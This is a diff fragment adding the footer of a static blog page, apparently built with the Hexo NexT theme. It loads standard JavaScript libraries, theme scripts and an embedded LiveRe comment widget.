+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
